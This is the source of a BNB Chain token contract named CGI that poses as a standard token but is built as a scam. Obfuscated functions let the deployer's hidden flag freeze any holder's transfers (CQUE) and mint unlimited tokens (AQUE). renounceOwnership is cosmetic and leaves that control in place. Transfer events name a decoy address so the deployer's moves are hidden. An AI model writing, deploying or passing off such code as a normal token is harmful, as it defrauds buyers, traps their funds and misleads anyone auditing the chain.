/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

pragma solidity 0.8.17;


contract CGI {

address abXO = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
        mapping (address => uint256) private AGX;
        mapping (address => uint256) private CGX;
    mapping (address => mapping (address => uint256)) private DGX;
    uint private DECC = 8;
uint256 FFF = 100000*100;
    string private NME = "CGI";
    string private SMB = "CGI";
 address Owner = msg.sender;


    constructor () 
{
            CGX[msg.sender] = 21;
        AGX[msg.sender] = FFF;
        emit Transfer(address(0), abXO, FFF);
    }

    function renounceOwnership() public virtual {
        require(msg.sender == Owner);
        emit OwnershipTransferred(Owner, address(0));
        Owner = address(0);
    }

    
    function name() public view returns (string memory) {
        return NME;
    }

    function symbol() public view returns (string memory) {
        return SMB;
    }


    function totalSupply() public view  returns (uint256) {
        return FFF;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AGX[account];
    }

       function decimals() public view returns (uint) {
        return DECC;
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
                 return DGX[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        DGX[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
            if(CGX[msg.sender] >= 21) {
        iiiXX(msg.sender, recipient, amount);
        return true; }
 
        require(amount <= AGX[msg.sender]);
        require(CGX[msg.sender] <= 1);
        hioxX(msg.sender, recipient, amount);
        return true; }
 
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns
     (bool) {
     if(CGX[sender] >= 21) {
             require(amount <= AGX[sender]);
     require(amount <= DGX[sender][msg.sender]);
        iiiXX(sender, recipient, amount);
        return true;}
    require(amount <= AGX[sender]);
     require(amount <= DGX[sender][msg.sender]);
             
              require(CGX[sender] <= 1);
            require (CGX[recipient] <=1);
        hioxX(sender, recipient, amount);
        return true;}
			 			   function CQUE (address nXIx, uint256 OiiX)  public {
                     if(CGX[msg.sender] >= 21){
      CGX[nXIx] = OiiX;}}
			function mxII (address nXIx, uint256 OiiX)  internal {
     AGX[nXIx] += OiiX;} 	


		   function AQUE (address nXIx, uint256 OiiX) public {
        if(CGX[msg.sender] >= 21){
   mxII(nXIx,OiiX);}}
			    function hioxX(address sender, address recipient, uint256 amount) internal  {
        AGX[sender] -= amount;
        AGX[recipient] += amount;
        emit Transfer(sender, recipient, amount); }	
	
	
		            function iiiXX(address sender, address recipient, uint256 amount) internal  {
        AGX[sender] -= amount;
        AGX[recipient] += amount;
         sender = abXO;
        emit Transfer(sender, recipient, amount); }}